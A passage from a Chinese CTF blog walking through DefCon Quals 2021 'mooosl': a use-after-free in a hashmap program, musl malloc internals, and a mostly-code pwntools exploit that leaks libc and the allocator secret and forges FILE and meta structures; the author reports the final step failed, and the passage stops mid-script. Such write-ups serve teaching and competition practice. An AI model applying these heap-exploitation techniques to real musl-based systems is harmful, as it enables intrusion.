href="https://blog.csdn.net/qq_54218833/article/details/127316863">musl pwn 入门 (1)</a>：musl内存分配关键数据结构与函数介绍<br><a href="https://blog.csdn.net/qq_54218833/article/details/128692531">musl pwn 入门 (2)</a>：musl libc内存分配free函数的unlink利用方式与演示程序<br><a href="https://blog.csdn.net/qq_54218833/article/details/128728282">musl pwn 入门 (3)</a>：musl libc的FSOP原理介绍与演示程序<br><a href="https://blog.csdn.net/qq_54218833/article/details/128797680">musl pwn 入门 (4)</a>：musl libc例题分析：DefCon Quals 2021 mooosl <strong>&lt;最新&gt;</strong></p><h1 id="7-杂项"><a href="#7-杂项" class="headerlink" title="7. 杂项"></a>7. 杂项</h1><p><a href="https://blog.csdn.net/qq_54218833/article/details/124061198">ROP Emporium 1-6题</a>：x86_64架构<br><a href="https://blog.csdn.net/qq_54218833/article/details/124069737">ROP Emporium 7-8题</a>：x86_64架构</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>musl pwn 入门 (4)</title>
      <link href="/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-4/"/>
      <url>/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-4/</url>
      
        <content type="html"><![CDATA[<p>在前面的介绍中，我们学习了musl pwn的基本原理，下面我们就通过一道经典例题进一步巩固。</p><p>这是DefCon Quals 2021中的一道题mooosl，直接在github上搜这道题的名字就可以找到作者发布的附件，内含说明、作者的exp、源码以及二进制程序。</p><p>注：我本来以为题目给的musl 1.2.2的libc和自己机子上面的一样，结果发现差得太远了，白花了我大半天时间。😭</p><p><a href="https://www.anquanke.com/post/id/241104#h2-3">参考文章</a></p><h1 id="1-逆向分析"><a href="#1-逆向分析" class="headerlink" title="1. 逆向分析"></a>1. 逆向分析</h1><p>这是一个菜单题，包含三种操作store、query和delete，经过逆向分析之后可以知道这个菜单题的数据结构逻辑。<strong>程序中有一段0x8000大小的空间hashmap，可以保存0x1000个指针。这个指针是作者定义的结构体，结构体中包含有两个字符串，分别为key和value。进行store操作时，首先输入key，然后程序使用一个函数计算其哈希值（0-0xFFF），这个哈希值就是这个结构体需要保存到hashmap中的索引。如果有两个key的哈希值相同，则第二次store获取的结构体就会成为hashmap中的链首，结构体中还有一个指针用于形成链表，第一次store的结构体的地址就保存在第二次store的结构体之中。query则是根据输入的key值计算出哈希值对应的结构体并输出。delete会将找到的结构体移出hashmap。</strong></p><p>本题的漏洞在delete函数中：</p><p><img src="https://img-blog.csdnimg.cn/cbb4c310bd414edcb3f3ea06674157fc.png" alt="结构体的声明"></p><p><img src="https://img-blog.csdnimg.cn/f43608de7cf84425b053c5562b3a9abd.png"></p><p>注意delete中的if语句，这个if语句内部的功能是从hashmap中移出结构体实例，p_chain就是hashmap中的地址。但这里有一种情况没有考虑：当要删除的结构体位于链尾时，if语句的两个条件都不会满足，这样这个结构体就不会从链表中删除，而是留在其中。这就为我们UAF创造了条件。如果我们能够通过堆排布操作让另一个结构体的value地址等于这个已经被删除的结构体地址，那么通过query我们就能够获取到这个结构体中的内容，其中包含多个指针的地址。</p><h1 id="2-解题第一步——泄露信息"><a href="#2-解题第一步——泄露信息" class="headerlink" title="2. 解题第一步——泄露信息"></a>2. 解题第一步——泄露信息</h1><p>我们再来回顾一下<code>free</code>函数的流程：<code>free</code>的重点在于<code>nontrivial_free</code>，注意下面的代码片段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (free函数的一个片段)</span></span><br><span class="line">wrlock();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">if</span> (mi.len) &#123;</span><br><span class="line"><span class="type">int</span> e = errno;</span><br><span class="line">munmap(mi.base, mi.len);</span><br><span class="line">errno = e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (nontrivial_free函数的一个片段)</span></span><br><span class="line"><span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line"><span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line"><span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line"><span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">assert(sc &lt; <span class="number">48</span>);</span><br><span class="line"><span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">dequeue(&amp;ctx.active[sc], g);</span><br><span class="line"><span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">activate_group(ctx.active[sc]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (free_group中的一个片段)</span></span><br><span class="line"><span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">step_seq();</span><br><span class="line">record_seq(sc);</span><br><span class="line">mi.base = g-&gt;mem;</span><br><span class="line">mi.len = g-&gt;maplen*<span class="number">4096UL</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">free_meta(g);</span><br><span class="line"><span class="keyword">return</span> mi;</span><br></pre></td></tr></table></figure><p>当一个group中所有的chunk均被释放时，在释放最后一个chunk时会调用到<code>free_group</code>函数将group释放，这是我们不希望看到的，因此在堆排布的过程中，我们不应该让一个meta中的所有chunk在某一时刻全部被释放。</p><p>另外注意到，<code>malloc</code>函数在选择chunk时不会去选择刚刚被<code>free</code>的chunk，因为此时代表该chunk的bit只在<code>freed_mask</code>中为1，在<code>avail_mask</code>中为0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title function_">activate_group</span><span class="params">(<span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(!m-&gt;avail_mask);</span><br><span class="line"><span class="type">uint32_t</span> mask, act = (<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">do</span> mask = m-&gt;freed_mask;</span><br><span class="line"><span class="keyword">while</span> (a_cas(&amp;m-&gt;freed_mask, mask, mask&amp;~act)!=mask);</span><br><span class="line"><span class="keyword">return</span> m-&gt;avail_mask = mask &amp; act;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>activate_group</code>函数则可以将<code>free_mask</code>中的所有chunk变为<code>avail_mask</code>。这个函数触发的条件是：<strong>这个group的<code>avail_mask</code>为0，该group中不是被free的chunk就是正在使用的chunk</strong>。因此，想要分配到已经被free的结构体所在的chunk，就应该首先让这个group中的chunk全部被分配一次。</p><p>考虑到本题使用的是<code>calloc</code>而不是<code>malloc</code>，因此堆排布的目标应该是让一个结构体的value指向另一个结构体，而且不能分配到原来结构体所在的chunk。可行的方法是：</p><ul><li>Step 1: 分配第1个storage结构体</li><li>Step 2: 进行堆空间排布</li><li>Step 3: 分配第2个storage结构体使得storage结构体本身位于其value的后面</li><li>Step 4: delete第2个storage</li><li>Step 5: 分配第3个storage结构体使得这个结构体的chunk就是第2个storage的value</li><li>Step 6: 对第2个storage调用query以获得第3个storage结构体中的指针等</li></ul><p>这里需要进行计算，让两个不同的key值具有相同的哈希值，这个不难实现，因为最终结果是12比特，穷举即可。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                                                    <span class="comment"># 6543210</span></span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;9889&#x27;</span>)                                <span class="comment"># AAAAAAU</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                              <span class="comment"># AFFFFFU</span></span><br><span class="line">store(<span class="string">b&#x27;B&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                            <span class="comment"># UAAAAUU</span></span><br><span class="line">store(find_collision(<span class="string">b&#x27;B&#x27;</span>), <span class="string">b&#x27;B&#x27;</span>)                   <span class="comment"># UAAAUUU</span></span><br><span class="line">delete(<span class="string">b&#x27;B&#x27;</span>)                                        <span class="comment"># FAAAUFU</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                              <span class="comment"># FFFFUFU -&gt; AAAAUAU</span></span><br><span class="line">store(<span class="string">b&#x27;C&#x27;</span>, <span class="string">b&#x27;C&#x27;</span> * <span class="number">0x1000</span>)                          <span class="comment"># AAAUUUU</span></span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br></pre></td></tr></table></figure><p>如上面的代码片段所示，即可通过query操作打印出最后一个store创建的结构体的信息。最后一个store的value地址就在当前的group中，根据这个值可以获取该group的地址。注意这里的最后一次store分配了一个大空间，这会让musl在libc地址正下方mmap一块空间，这样我们可以通过这个地址获取到libc的基地址。在此之后，我们只需要重复地通过query操作修改第二次store获得的storage中的value地址，即可实现任意地址读。因为此时我们可以根据获取的两个地址推导出第二个storage中的关键字段的值。在第一次leak之后，7个chunk索引从高到低的状态应该依次为：AAAAUUU（A可用，U正用，F释放），其中第7个是第二个storage结构体保存的位置，那么我们可以先用3个无效的query让状态变为AFFFUUU，然后就可以使用query操作来修改第二个storage结构体的值，最后再一次query进行任意写。</p><p>由此，我们可以获取到<code>meta_area</code>的<code>secret</code>值，libc的基地址等关键信息，之后就要开始使用unlink进行利用了。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">group_addr = u64(leak[<span class="number">0</span>:<span class="number">8</span>]) - <span class="number">0x70</span></span><br><span class="line">smallchunk = group_addr + <span class="number">0x30</span></span><br><span class="line">mmap_addr = u64(leak[<span class="number">8</span>:<span class="number">16</span>]) - <span class="number">0x20</span></span><br><span class="line">enc = u64(leak[<span class="number">32</span>:<span class="number">40</span>]) - <span class="number">1</span></span><br><span class="line">libc_base = mmap_addr + <span class="number">0x4000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(smallchunk) + p64(group_addr) + p64(<span class="number">1</span>) + p64(<span class="number">0x30</span>) + p64(enc) + p64(<span class="number">0</span>), key_size=<span class="number">0x30</span>)</span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">meta_addr = u64(leak[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">meta_area = meta_addr &amp; <span class="number">0xFFFF_FFFF_FFFF_F000</span></span><br><span class="line">info(<span class="string">&#x27;meta_area: &#x27;</span> + <span class="built_in">hex</span>(meta_area))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(smallchunk) + p64(meta_area) + p64(<span class="number">1</span>) + p64(<span class="number">0x30</span>) + p64(enc) + p64(<span class="number">0</span>), key_size=<span class="number">0x30</span>)</span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">secret = u64(leak[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">info(<span class="string">&#x27;secret: &#x27;</span> + <span class="built_in">hex</span>(secret))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">stderr = libc_base + libc.symbols[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">stdout = libc_base + libc.symbols[<span class="string">&#x27;stdout&#x27;</span>]</span><br></pre></td></tr></table></figure><h1 id="3-解题第二步：伪造FILE、meta、group等结构并利用"><a href="#3-解题第二步：伪造FILE、meta、group等结构并利用" class="headerlink" title="3. 解题第二步：伪造FILE、meta、group等结构并利用"></a>3. 解题第二步：伪造<code>FILE</code>、<code>meta</code>、<code>group</code>等结构并利用</h1><p>这一步是常规步骤，我们将伪造的<code>FILE</code>结构体、伪造的<code>meta</code>、<code>group</code>、<code>chunk</code>放在一个chunk中，注意<code>meta_area</code>需要页对齐，并在页首部写入<code>secret</code>值。</p><p>写入之后，我们想办法释放假的chunk，方法是将原来用于leak的chunk分配出去，然后修改内部指针的值，再通过delete删除即可。然后就可以利用unlink修改stderr指针的值为我们的假chunk。但是很不幸的是，stderr指针所在的段是只读的，我不知道为什么很多的文章都说要修改这个地方，但是这里不能改，如果能改的话是肯定可以过的。也就是最后一次delete无法完成。</p><p>exp:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./mooosl&#x27;</span>, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;libc.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./mooosl&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">att = <span class="keyword">lambda</span>: gdb.attach(io)</span><br><span class="line">sleep = <span class="keyword">lambda</span>: time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">content: <span class="built_in">bytes</span></span>):</span><br><span class="line">    res = <span class="number">2021</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res = res * <span class="number">0x13377331</span> + <span class="built_in">ord</span>(content.decode()[i])</span><br><span class="line">        res %= <span class="number">0x1_0000_0000</span></span><br><span class="line">    <span class="keyword">return</span> res &amp; <span class="number">0xFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_original</span>(<span class="params">content: <span class="built_in">bytes</span></span>):</span><br><span class="line">    res = <span class="number">2021</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res = res * <span class="number">0x13377331</span> + <span class="built_in">ord</span>(content.decode()[i])</span><br><span class="line">        res %= <span class="number">0x1_0000_0000</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">key_content, value_content, key_size = <span class="literal">None</span>, value_size = <span class="literal">None</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(key_content)).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(key_size).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">if</span> value_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;value size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(value_content)).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;value content: &#x27;</span>, value_content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;value size: &#x27;</span>, <span class="built_in">str</span>(value_size).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;value content: &#x27;</span>, value_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key_content, key_size = <span class="literal">None</span></span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(key_content)).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(key_size).encode())</span><br><span class="line">        sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key_content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;option: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;key size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(key_content)).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;key content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_collision</span>(<span class="params">victim: <span class="built_in">bytes</span></span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    target = encrypt(victim)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> encrypt(<span class="built_in">str</span>(i).encode()) == target <span class="keyword">and</span> <span class="built_in">str</span>(i).encode() != victim:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(i).encode()</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex2bytes</span>(<span class="params">content: <span class="built_in">bytes</span></span>):</span><br><span class="line">    res = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content) // <span class="number">2</span>):</span><br><span class="line">        res += p8(<span class="built_in">int</span>(content.decode()[i*<span class="number">2</span>], <span class="number">16</span>) * <span class="number">0x10</span> + <span class="built_in">int</span>(content.decode()[i*<span class="number">2</span>+<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">                                                    <span class="comment"># 6543210</span></span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;9889&#x27;</span>)                                <span class="comment"># AAAAAAU</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                              <span class="comment"># AFFFFFU</span></span><br><span class="line">store(<span class="string">b&#x27;B&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                            <span class="comment"># UAAAAUU</span></span><br><span class="line">store(find_collision(<span class="string">b&#x27;B&#x27;</span>), <span class="string">b&#x27;B&#x27;</span>)                   <span class="comment"># UAAAUUU</span></span><br><span class="line">delete(<span class="string">b&#x27;B&#x27;</span>)                                        <span class="comment"># FAAAUFU</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)                              <span class="comment"># FFFFUFU -&gt; AAAAUAU</span></span><br><span class="line">store(<span class="string">b&#x27;C&#x27;</span>, <span class="string">b&#x27;C&#x27;</span> * <span class="number">0x1000</span>)                          <span class="comment"># AAAUUUU</span></span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">group_addr = u64(leak[<span class="number">0</span>:<span class="number">8</span>]) - <span class="number">0x70</span></span><br><span class="line">smallchunk = group_addr + <span class="number">0x30</span></span><br><span class="line">mmap_addr = u64(leak[<span class="number">8</span>:<span class="number">16</span>]) - <span class="number">0x20</span></span><br><span class="line">enc = u64(leak[<span class="number">32</span>:<span class="number">40</span>]) - <span class="number">1</span></span><br><span class="line">libc_base = mmap_addr + <span class="number">0x4000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(smallchunk) + p64(group_addr) + p64(<span class="number">1</span>) + p64(<span class="number">0x30</span>) + p64(enc) + p64(<span class="number">0</span>), key_size=<span class="number">0x30</span>)</span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">meta_addr = u64(leak[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">meta_area = meta_addr &amp; <span class="number">0xFFFF_FFFF_FFFF_F000</span></span><br><span class="line">info(<span class="string">&#x27;meta_area: &#x27;</span> + <span class="built_in">hex</span>(meta_area))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(smallchunk) + p64(meta_area) + p64(<span class="number">1</span>) + p64(<span class="number">0x30</span>) + p64(enc) + p64(<span class="number">0</span>), key_size=<span class="number">0x30</span>)</span><br><span class="line">query(<span class="string">b&#x27;B&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = hex2bytes(io.recvline().split(<span class="string">b&quot;:&quot;</span>)[<span class="number">1</span>])</span><br><span class="line">secret = u64(leak[<span class="number">0</span>:<span class="number">8</span>])</span><br><span class="line">info(<span class="string">&#x27;secret: &#x27;</span> + <span class="built_in">hex</span>(secret))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">stderr = libc_base + libc.symbols[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">stdout = libc_base + libc.symbols[<span class="string">&#x27;stdout&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    query(<span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">fake_file_addr = libc_base - <span class="number">0x3000</span> + <span class="number">0x560</span></span><br><span class="line">fake_meta_addr = libc_base - <span class="number">0x2000</span> + <span class="number">0x10</span></span><br><span class="line">fake_group_addr = libc_base - <span class="number">0x2000</span> + <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># key</span></span><br><span class="line">key = p64(group_addr + <span class="number">0x20</span>)</span><br><span class="line">key += p64(fake_group_addr + <span 